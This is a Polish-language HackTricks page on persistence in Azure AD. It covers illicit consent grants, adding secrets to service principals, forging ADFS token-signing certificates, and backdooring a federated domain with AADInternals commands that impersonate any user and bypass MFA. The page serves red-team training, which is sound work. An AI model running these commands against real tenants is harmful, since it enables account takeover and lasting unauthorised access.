# Az - Wytrwałość

{% hint style="success" %}
Dowiedz się i ćwicz Hacking AWS: <img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Dowiedz się i ćwicz Hacking GCP: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wesprzyj HackTricks</summary>

* Sprawdź [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Dziel się trikami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) na githubie.

</details>
{% endhint %}

### Nielegalne Udzielenie Zgody

Domyślnie każdy użytkownik może zarejestrować aplikację w Azure AD. Możesz zarejestrować aplikację (tylko dla docelowego najemcy), która wymaga uprawnień o wysokim wpływie z zgodą administratora (zatwierdź ją, jeśli jesteś administratorem) - na przykład wysyłanie wiadomości w imieniu użytkownika, zarządzanie rolami itp. To pozwoli nam **przeprowadzić ataki phishingowe**, które byłyby bardzo **owocne** w przypadku sukcesu.

Co więcej, możesz także zaakceptować tę aplikację za pomocą swojego użytkownika jako sposób na utrzymanie dostępu do niej.

### Aplikacje i Podmioty Usług

Dzięki uprawnieniom Administratora aplikacji, GA lub niestandardowej roli z uprawnieniami microsoft.directory/applications/credentials/update, możemy dodać poświadczenia (sekret lub certyfikat) do istniejącej aplikacji.

Możliwe jest **celowanie w aplikację z wysokimi uprawnieniami** lub **dodanie nowej aplikacji** z wysokimi uprawnieniami.

Interesującą rolą do dodania do aplikacji byłaby **Rola administratora autoryzacji uprzywilejowanej**, ponieważ pozwala ona na **zresetowanie hasła** Globalnych Administratorów.

Ta technika również pozwala na **obejście MFA**.

{% code overflow="wrap" %}
```powershell
$passwd = ConvertTo-SecureString "J~Q~QMt_qe4uDzg53MDD_jrj_Q3P.changed" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential("311bf843-cc8b-459c-be24-6ed908458623", $passwd)
Connect-AzAccount -ServicePrincipal -Credential $credentials -Tenant e12984235-1035-452e-bd32-ab4d72639a
```
{% endcode %}

* Dla uwierzytelniania opartego na certyfikatach
```powershell
Connect-AzAccount -ServicePrincipal -Tenant <TenantId> -CertificateThumbprint <Thumbprint> -ApplicationId <ApplicationId>
```
{% endcode %}

### Federacja - Certyfikat podpisywania tokenów

Mając **uprawnienia DA** w lokalnym AD, można utworzyć i zaimportować **nowe certyfikaty podpisywania tokenów** oraz **certyfikaty deszyfrowania tokenów**, które mają bardzo długą ważność. Pozwoli nam to **zalogować się jako dowolny użytkownik**, którego ImmutableID znamy.

**Uruchom** poniższą komendę jako **DA na serwerach ADFS**, aby utworzyć nowe certyfikaty (domyślne hasło to 'AADInternals'), dodać je do ADFS, wyłączyć automatyczne odnawianie i zrestartować usługę:
```powershell
New-AADIntADFSSelfSignedCertificates
```
Następnie zaktualizuj informacje o certyfikacie za pomocą Azure AD:
```powershell
Update-AADIntADFSFederationSettings -Domain cyberranges.io
```
### Federacja - Zaufana domena

Posiadając uprawnienia GA w dzierżawie, można **dodać nową domenę** (musi zostać zweryfikowana), skonfigurować jej typ uwierzytelniania na Federated oraz skonfigurować domenę do **zaufania określonemu certyfikatowi** (any.sts w poniższej komendzie) i wydawcy:
```powershell
# Using AADInternals
ConvertTo-AADIntBackdoor -DomainName cyberranges.io

# Get ImmutableID of the user that we want to impersonate. Using Msol module
Get-MsolUser | select userPrincipalName,ImmutableID

# Access any cloud app as the user
Open-AADIntOffice365Portal -ImmutableID qIMPTm2Q3kimHgg4KQyveA== -Issuer "http://any.sts/B231A11F" -UseBuiltInCertificate -ByPassMFA$true
```
## Odnośniki

* [https://aadinternalsbackdoor.azurewebsites.net/](https://aadinternalsbackdoor.azurewebsites.net/)

{% hint style="success" %}
Naucz się i praktykuj Hacking w AWS:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Naucz się i praktykuj Hacking w GCP: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wesprzyj HackTricks</summary>

* Sprawdź [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Udostępnij sztuczki hakerskie, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) na githubie.

</details>
{% endhint %}
